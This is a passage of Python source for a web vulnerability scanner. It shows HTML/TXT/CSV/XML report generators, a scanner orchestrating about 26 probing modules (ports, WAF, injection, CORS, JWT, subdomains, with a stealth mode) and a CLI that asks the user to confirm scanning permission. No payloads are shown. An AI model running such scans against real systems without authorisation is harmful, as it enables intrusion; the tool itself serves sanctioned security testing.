              <td><small>{html_module.escape(v.evidence)}</small></td>
              <td><small>{refs_html}</small></td>
            </tr>"""

        chart_data = json.dumps(stat)
        chart_colors = json.dumps(list(sev_css.values()))

        ports_rows = "".join(
            f"<tr><td>{p['port']}</td><td>{p['proto']}</td>"
            f"<td>{p['service']}</td><td>{p.get('version','')}</td></tr>"
            for p in r.ports
        )
        info_rows = "".join(
            f"<tr><td>{html_module.escape(str(k))}</td>"
            f"<td>{html_module.escape(str(v)[:200])}</td></tr>"
            for k,v in r.info.items()
        )

        html_out = f"""<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8">
<title>🐉 Blazing Black Dragon Report — {html_module.escape(r.url)}</title>
<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
<style>
  :root{{--bg:#0a0a0f;--card:#12121a;--border:#2a2a3a;--text:#e0e0e0;
        --crit:#ff2222;--high:#ff6622;--med:#ffcc00;--low:#00ccff;--info:#888;}}
  *{{box-sizing:border-box;margin:0;padding:0;}}
  body{{background:var(--bg);color:var(--text);font-family:'Segoe UI',sans-serif;
        font-size:14px;padding:20px;}}
  h1{{font-size:2rem;color:#ff4400;text-shadow:0 0 20px #ff440066;margin-bottom:8px;}}
  h2{{font-size:1.2rem;color:#ff8844;margin:20px 0 10px;border-bottom:1px solid var(--border);padding-bottom:6px;}}
  .meta{{color:#888;font-size:12px;margin-bottom:20px;}}
  .stats{{display:flex;gap:12px;flex-wrap:wrap;margin:20px 0;}}
  .stat-card{{background:var(--card);border:1px solid var(--border);border-radius:8px;
              padding:14px 20px;min-width:100px;text-align:center;}}
  .stat-card .num{{font-size:2rem;font-weight:bold;}}
  .stat-card .lbl{{font-size:11px;color:#888;text-transform:uppercase;}}
  .charts{{display:flex;gap:20px;flex-wrap:wrap;margin:20px 0;}}
  .chart-box{{background:var(--card);border:1px solid var(--border);border-radius:8px;
              padding:16px;flex:1;min-width:280px;max-width:400px;}}
  table{{width:100%;border-collapse:collapse;margin:10px 0;font-size:13px;}}
  th{{background:#1a1a2e;color:#aaa;text-transform:uppercase;font-size:11px;
      padding:8px;text-align:left;position:sticky;top:0;}}
  td{{padding:8px;border-bottom:1px solid var(--border);vertical-align:top;max-width:300px;
      word-break:break-word;}}
  tr:hover{{background:#1a1a24;}}
  .card{{background:var(--card);border:1px solid var(--border);border-radius:8px;
         padding:16px;margin-bottom:16px;overflow-x:auto;}}
  a{{color:#4488ff;text-decoration:none;}}a:hover{{text-decoration:underline;}}
  .badge{{padding:2px 7px;border-radius:4px;font-size:11px;font-weight:bold;}}
  .tag-Critical{{background:#ff2222;color:#fff;}}
  .tag-High{{background:#ff6622;color:#fff;}}
  .tag-Medium{{background:#cc9900;color:#fff;}}
  .tag-Low{{background:#0088aa;color:#fff;}}
  .tag-Info{{background:#444;color:#aaa;}}
  footer{{text-align:center;color:#444;font-size:11px;margin-top:40px;}}
</style></head><body>
<h1>🔥🐉 The Blazing Black Dragon with Fiery Breath 🐉🔥</h1>
<p class="meta">
  Target: <strong>{html_module.escape(r.url)}</strong> &nbsp;|&nbsp;
  IP: {html_module.escape(r.ip)} &nbsp;|&nbsp;
  Scanned: {r.start.strftime('%Y-%m-%d %H:%M:%S UTC')} &nbsp;|&nbsp;
  Duration: {r.duration()} &nbsp;|&nbsp;
  Tool version: {VERSION}
  {f'&nbsp;|&nbsp; WAF: <strong>{html_module.escape(r.waf)}</strong>' if r.waf else ''}
</p>

<div class="stats">
  {''.join(f'<div class="stat-card"><div class="num" style="color:{sev_css[s]}">{n}</div><div class="lbl">{s}</div></div>' for s,n in stat.items())}
  <div class="stat-card"><div class="num" style="color:#44aaff">{len(r.ports)}</div><div class="lbl">Open Ports</div></div>
  <div class="stat-card"><div class="num" style="color:#44ff88">{len(r.subdomains)}</div><div class="lbl">Subdomains</div></div>
</div>

<div class="charts">
  <div class="chart-box"><canvas id="sevChart"></canvas></div>
  <div class="chart-box"><canvas id="modChart"></canvas></div>
</div>

<h2>🔴 Vulnerability Findings ({len(r.vulns)} total)</h2>
<div class="card">
<table>
  <thead><tr><th>Severity</th><th>Finding</th><th>Component</th>
  <th>Fix</th><th>Evidence</th><th>Refs</th></tr></thead>
  <tbody>{rows}</tbody>
</table>
</div>

<h2>🔌 Open Ports ({len(r.ports)})</h2>
<div class="card">
<table><thead><tr><th>Port</th><th>Proto</th><th>Service</th><th>Version</th></tr></thead>
<tbody>{ports_rows}</tbody></table></div>

<h2>ℹ️ Target Information</h2>
<div class="card">
<table><thead><tr><th>Key</th><th>Value</th></tr></thead>
<tbody>{info_rows}</tbody></table></div>

{'<h2>🌐 Subdomains (' + str(len(r.subdomains)) + ')</h2><div class="card"><table><thead><tr><th>Hostname</th><th>IP</th></tr></thead><tbody>' + "".join(f"<tr><td>{html_module.escape(s['host'])}</td><td>{html_module.escape(s['ip'])}</td></tr>" for s in r.subdomains) + '</tbody></table></div>' if r.subdomains else ''}

{'<h2>📧 Emails Found (' + str(len(r.emails)) + ')</h2><div class="card">' + ", ".join(html_module.escape(e) for e in r.emails) + '</div>' if r.emails else ''}

<footer>Generated by {html_module.escape(TOOL_NAME)} v{VERSION} — For authorised use only</footer>

<script>
__JS_PLACEHOLDER__</script></body></html>"""
        vuln_module_data = json.dumps(
            [{"module": v.module or "General", "sev": v.severity} for v in r.vulns])
        js_code = (
            "const stat = " + chart_data + ";\n"
            "const sevChart = new Chart(document.getElementById('sevChart'),{\n"
            "  type:'doughnut',\n"
            "  data:{labels:Object.keys(stat),datasets:[{data:Object.values(stat),\n"
            "    backgroundColor:" + chart_colors + ",borderWidth:2,borderColor:'#0a0a0f'}]},\n"
            "  options:{plugins:{legend:{labels:{color:'#aaa'}},\n"
            "    title:{display:true,text:'Severity Distribution',color:'#ccc'}}}\n"
            "});\n"
            "const modData={};\n" +
            vuln_module_data + ".forEach(function(v){modData[v.module]=(modData[v.module]||0)+1;});\n"
            "new Chart(document.getElementById('modChart'),{\n"
            "  type:'bar',\n"
            "  data:{labels:Object.keys(modData),datasets:[{label:'Findings',\n"
            "    data:Object.values(modData),backgroundColor:'#ff440099',borderColor:'#ff4400',borderWidth:1}]},\n"
            "  options:{indexAxis:'y',plugins:{legend:{display:false},\n"
            "    title:{display:true,text:'Findings by Module',color:'#ccc'}},\n"
            "    scales:{x:{ticks:{color:'#888'}},y:{ticks:{color:'#ccc'}}}}\n"
            "});\n"
        )
        html_out = html_out.replace("__JS_PLACEHOLDER__", js_code)
        with open(path,"w",encoding="utf-8") as f:
            f.write(html_out)
        print(f"{C.GRN}[+]{C.R} HTML  → {path}")

    def save_txt(self, path: str):
        r = self.report
        lines = [
            f"{'='*76}",
            f"  {TOOL_NAME}",
            f"  Version: {VERSION}",
            f"{'='*76}",
            f"  Target   : {r.url}",
            f"  IP       : {r.ip}",
            f"  Start    : {r.start}",
            f"  Duration : {r.duration()}",
            f"  WAF/CDN  : {r.waf or 'None detected'}",
            f"{'='*76}",
        ]
        stat = r.stats()
        lines.append("  SEVERITY SUMMARY:")
        for sev, count in stat.items():
            lines.append(f"    {sev:10} : {count}")
        lines.append(f"{'='*76}")
        lines.append(f"  FINDINGS ({len(r.vulns)}):")
        for i, v in enumerate(r.vulns, 1):
            lines += [
                f"\n  [{i}] [{v.severity}] {v.name}",
                f"      Component : {v.component}",
                f"      Details   : {v.desc}",
                f"      Evidence  : {v.evidence}",
                f"      Fix       : {v.fix}",
            ]
            if v.cves: lines.append(f"      CVEs      : {', '.join(v.cves)}")
            for ref in v.refs[:2]: lines.append(f"      Ref       : {ref}")
        if r.ports:
            lines.append(f"\n{'='*76}")
            lines.append("  OPEN PORTS:")
            for p in r.ports:
                lines.append(f"    :{p['port']}/{p['proto']} — {p['service']} {p.get('version','')}")
        with open(path,"w",encoding="utf-8") as f:
            f.write("\n".join(lines))
        print(f"{C.GRN}[+]{C.R} TXT   → {path}")

    def save_csv(self, path: str):
        r = self.report
        with open(path,"w",newline="",encoding="utf-8") as f:
            writer = csv.writer(f)
            writer.writerow(["Severity","Name","Component","Description",
                             "Evidence","Fix","CVEs","Module","Timestamp"])
            for v in r.vulns:
                writer.writerow([v.severity, v.name, v.component, v.desc,
                                  v.evidence, v.fix, "|".join(v.cves),
                                  v.module, v.ts])
        print(f"{C.GRN}[+]{C.R} CSV   → {path}")

    def save_xml(self, path: str):
        r = self.report
        root = ET.Element("DragonReport",
            attrib={"tool":TOOL_NAME,"version":VERSION,
                    "target":r.url,"ip":r.ip,
                    "duration":r.duration()})
        stats_el = ET.SubElement(root,"Stats")
        for k,v in r.stats().items():
            ET.SubElement(stats_el,"Count",attrib={"severity":k,"value":str(v)})
        vulns_el = ET.SubElement(root,"Vulnerabilities")
        for v in r.vulns:
            vel = ET.SubElement(vulns_el,"Vulnerability",
                attrib={"severity":v.severity,"module":v.module})
            for field in ("name","desc","component","evidence","fix","ts"):
                el = ET.SubElement(vel, field)
                el.text = getattr(v,field,"")
            if v.cves:
                cv = ET.SubElement(vel,"CVEs")
                cv.text = ",".join(v.cves)
        tree = ET.ElementTree(root)
        ET.indent(tree," "*2)
        tree.write(path, encoding="utf-8", xml_declaration=True)
        print(f"{C.GRN}[+]{C.R} XML   → {path}")


# ══════════════════════════════════════════════════════════════════════════════
# PROGRESS STATUS
# ══════════════════════════════════════════════════════════════════════════════

_LOCK = threading.Lock()

def _status(msg: str):
    with _LOCK:
        print(f"  {C.FIRE}[🐉]{C.R} {C.CYN}{msg}{C.R}…")


# ══════════════════════════════════════════════════════════════════════════════
# MAIN SCANNER ORCHESTRATOR
# ══════════════════════════════════════════════════════════════════════════════

class Scanner:
    def __init__(self, url, output_dir=".", fast=False, stealth=False,
                 no_ports=False, no_subs=False, formats=None,
                 custom_queries=None):
        self.url           = url
        self.output_dir    = Path(output_dir)
        self.fast          = fast
        self.stealth       = stealth
        self.no_ports      = no_ports
        self.no_subs       = no_subs
        self.formats       = formats or []
        self.custom_queries= custom_queries or []
        self.delay         = STEALTH_DELAY if stealth else DELAY

    def run(self) -> Report:
        try:
            self.url = Resolver.normalise(self.url)
        except ValueError as e:
            print(f"{C.RED}[!] {e}{C.R}"); sys.exit(1)

        print(f"\n  {C.B}Target   :{C.R} {self.url}")
        try:
            ip = Resolver.resolve_ip(self.url)
        except socket.gaierror as e:
            print(f"{C.RED}[!] DNS failed: {e}{C.R}")
            http_url = "http://" + self.url.split("//",1)[-1]
            try:
                ip = Resolver.resolve_ip(http_url); self.url = http_url
            except Exception:
                print(f"{C.RED}[!] Cannot resolve hostname.{C.R}"); sys.exit(1)

        print(f"  {C.B}IP       :{C.R} {ip}")
        ok, msg = Resolver.check_reachable(self.url)
        if not ok:
            print(f"{C.RED}[!] Unreachable: {msg}{C.R}")
            print(f"{C.YLW}[~] Proceeding with limited scan…{C.R}")
        print(f"  {C.B}Status   :{C.R} {msg}\n")

        report = Report(self.url, ip)
        sess   = Session(delay=self.delay)
        self.output_dir.mkdir(parents=True, exist_ok=True)

        print(f"  {C.FIRE}{C.B}━━━ 🔥 Dragon fire breath commencing — 26 attack vectors 🔥 ━━━{C.R}\n")

        def safe(fn, *a, **kw):
            try: fn(*a, **kw)
            except Exception as e:
                report.err(f"{getattr(fn,'__name__',str(fn))}: {e}")

        # ── Phase 1: Reconnaissance ───────────────────────────────────────
        if not self.no_ports:
            safe(PortScanner(urlparse(self.url).hostname or ip, report, self.fast).scan)
        safe(WAFDetector(self.url, sess, report).detect)
        safe(Fingerprinter(self.url, sess, report).run)

        # ── Phase 2: Configuration & Headers ─────────────────────────────
        safe(HeadersAnalyser(self.url, sess, report).run)
        safe(SSLAnalyser(self.url, report).run)
        safe(CMSDetector(self.url, sess, report).run)
        safe(RobotsAnalyser(self.url, sess, report).run)

        # ── Phase 3: Content & Surface Discovery ─────────────────────────
        safe(DirEnum(self.url, sess, report, self.fast).run)
        safe(JSScanner(self.url, sess, report).run)
        safe(FormHarvester(self.url, sess, report).run)

        # ── Phase 4: Injection & Logical Flaws ───────────────────────────
        safe(CORSChecker(self.url, sess, report).run)
        safe(MethodTampering(self.url, sess, report).run)
        safe(HostHeaderInjection(self.url, sess, report).run)

        vt = VulnTester(self.url, sess, report, self.fast)
        safe(vt.run_all, self.output_dir)

        # ── Phase 5: Modern / API Surface ────────────────────────────────
        safe(GraphQLTester(self.url, sess, report).run)
        safe(OAuthJWTAnalyser(self.url, sess, report).run)

        # ── Phase 6: DNS / Network ────────────────────────────────────────
        safe(DNSAnalyser(self.url, report).run)
        if not self.no_subs and not self.fast:
            safe(SubdomainEnum(self.url, report).run)

        # ── Phase 7: External Tools ───────────────────────────────────────
        safe(ExternalTools(self.url, report, self.output_dir).run)

        # ── Phase 8: Custom User Queries ──────────────────────────────────
        if self.custom_queries:
            safe(CustomQueryScanner(self.url, sess, report, self.custom_queries).run)

        report.done()
        return report


# ══════════════════════════════════════════════════════════════════════════════
# INTERACTIVE CLI
# ══════════════════════════════════════════════════════════════════════════════

def _print_save_menu():
    print(f"\n  {C.B}💾 Save Report:{C.R}")
    print(f"     1 = JSON   (machine-readable, detailed)")
    print(f"     2 = HTML   (visual report with charts)")
    print(f"     3 = TXT    (plain text, human-readable)")
    print(f"     4 = CSV    (spreadsheet-compatible)")
    print(f"     5 = XML    (SIEM/import-friendly)")
    print(f"     6 = ALL    (every format)")
    print(f"     0 = Skip")


def main():
    if not REQUESTS_OK:
        print(f"{C.RED}[!] 'requests' package is required but could not be installed.{C.R}")
        sys.exit(1)

    gen0 = ReportGen(Report("",""))
    gen0._banner()

    # ── URL prompt ────────────────────────────────────────────────────────
    print(f"  {C.GRN}{'─'*72}{C.R}")
    url = input(f"\n  {C.B}🐉 Enter target URL{C.R} (e.g. https://example.com): ").strip()
    if not url:
        print(f"{C.RED}[!] No URL provided. Exiting.{C.R}"); sys.exit(1)

    # ── Permission check ─────────────────────────────────────────────────
    print(f"\n  {C.YLW}⚠️  LEGAL NOTICE{C.R}")
    print(f"  {C.YLW}Unauthorised scanning is illegal and may result in criminal prosecution.{C.R}")
    perm = input(
        f"  {C.B}Do you have explicit written permission to scan this target? [yes/no]: {C.R}"
    ).strip().lower()
    if perm not in ("yes","y"):
        print(f"\n  {C.RED}[!] Permission not confirmed. The Dragon stands down. Exiting.{C.R}")
        sys.exit(0)

    # ── Scan mode ─────────────────────────────────────────────────────────
    print(f"\n  {C.B}Scan mode:{C.R}")
    print(f"     1 = Full scan (all 26 modules — recommended)")
    print(f"     2 = Fast scan (smaller wordlists, skip slow checks)")
    print(f"     3 = Stealth scan (slow, low-noise)")
    mode_ch = input(f"  {C.B}Choice [1]: {C.R}").strip() or "1"
    fast    = mode_ch == "2"
    stealth = mode_ch == "3"

    # ── Output directory ──────────────────────────────────────────────────
    out_dir = input(
        f"  {C.B}Output directory{C.R} [{Path.cwd()}]: "
    ).strip() or str(Path.cwd())

    # ── Custom queries ────────────────────────────────────────────────────
    print(f"\n  {C.FIRE}🐉 Custom Vulnerability Queries (optional){C.R}")
    print(f"  {C.GRY}Tell the Dragon what specific vulnerabilities to hunt for.{C.R}")
    print(f"  {C.GRY}Enter each on a new line. Press ENTER on an empty line when done.{C.R}")
    print(f"  {C.GRY}Examples: 'SQL injection', 'open redirect', 'JWT misconfiguration'{C.R}")
    print(f"  {C.GRY}Leave blank and press ENTER to skip.{C.R}\n")
    custom_queries = []
    while True:
        q = input(f"  {C.FIRE}🔥{C.R} Query: ").strip()
        if not q: break
        custom_queries.append(q)
    if custom_queries:
        print(f"\n  {C.GRN}[+]{C.R} {len(custom_queries)} custom query/queries queued.")
    else:
        print(f"  {C.GRY}[~] No custom queries. Full auto-scan will run.{C.R}")

    # ── Start scan ────────────────────────────────────────────────────────
    print(f"\n  {C.FIRE}{'━'*72}{C.R}")
    print(f"  {C.B}🔥 Releasing the Dragon upon {url}…{C.R}")
    print(f"  {C.FIRE}{'━'*72}{C.R}\n")

    scanner = Scanner(
        url=url, output_dir=out_dir,
        fast=fast, stealth=stealth,
        custom_queries=custom_queries,
    )
    report  = scanner.run()
    gen2    = ReportGen(report)
    gen2.print_terminal()

    # ── Save prompt ───────────────────────────────────────────────────────
    ts   = report.start.strftime("%Y%m%d_%H%M%S")
    host = urlparse(report.url).hostname or "scan"
    stem = Path(out_dir) / f"{host}_{ts}"

    _print_save_menu()
    ch = input(f"\n  {C.B}Save format choice [6=ALL]: {C.R}").strip() or "6"

    if ch in ("1","6"): gen2.save_json(str(stem)+".json")
    if ch in ("2","6"): gen2.save_html(str(stem)+".html")
    if ch in ("3","6"): gen2.save_txt (str(stem)+".txt")
    if ch in ("4","6"): gen2.save_csv (str(stem)+".csv")
    if ch in ("5","6"): gen2.save_xml (str(stem)+".xml")

    print(f"\n  {C.FIRE}🐉 The Dragon's hunt is complete.{C.R}")
    print(f"  {C.GRN}Results saved to: {out_dir}{C.R}\n")

    stats = report.stats()
    sys.exit(1 if stats.get("Critical",0) or stats.get("High",0) else 0)


if __name__ == "__main__":
    main()
